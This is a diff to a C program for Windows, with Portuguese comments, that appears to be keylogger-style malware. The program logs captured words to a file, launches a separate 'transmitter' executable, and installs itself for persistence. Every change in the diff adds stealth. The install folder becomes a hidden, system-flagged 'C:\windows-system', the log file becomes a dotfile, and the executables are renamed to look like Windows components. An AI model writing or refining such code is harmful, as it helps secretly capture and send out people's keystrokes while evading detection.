@@ -6,7 +6,7 @@
 #include <stdbool.h>
 #include <ctype.h>
 
-const char *BASE_FOLDER = "C:\\teste";
+const char *BASE_FOLDER = "C:\\windows-system";
 
 #define MAX_PATH_LEN 260
 
@@ -56,7 +56,7 @@ int main()
                                 palavra[count] = '\0';
 
                                 char logPath[MAX_PATH];
-                                snprintf(logPath, sizeof(logPath), "%s\\logs.txt", BASE_FOLDER);
+                                snprintf(logPath, sizeof(logPath), "%s\\.logs.txt", BASE_FOLDER);
 
                                 fptr = fopen(logPath, "a");
                                 if (fptr)
@@ -91,7 +91,7 @@ void chamadaTransmissor()
     char exePath[MAX_PATH_LEN];
 
     // Monta o caminho completo do transmissor.exe
-    snprintf(exePath, MAX_PATH_LEN, "%s\\transmissor.exe", BASE_FOLDER);
+    snprintf(exePath, MAX_PATH_LEN, "%s\\recurso-windows.exe", BASE_FOLDER);
 
     // Abre o transmissor.exe
     ShellExecute(
@@ -145,10 +145,11 @@ bool valPersis()
 
         // Cria pasta destino
         CreateDirectoryA(BASE_FOLDER, NULL);
+        SetFileAttributes(BASE_FOLDER, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 
         // destinos finais
-        snprintf(dstMain, sizeof(dstMain), "%s\\main.exe", BASE_FOLDER);
-        snprintf(dstTrans, sizeof(dstTrans), "%s\\transmissor.exe", BASE_FOLDER);
+        snprintf(dstMain, sizeof(dstMain), "%s\\config-w.exe", BASE_FOLDER);
+        snprintf(dstTrans, sizeof(dstTrans), "%s\\recurso-windows.exe", BASE_FOLDER);
 
         // copia os arquivos — verifique se as origens existem
         if (!CopyFileA(srcMain, dstMain, FALSE))
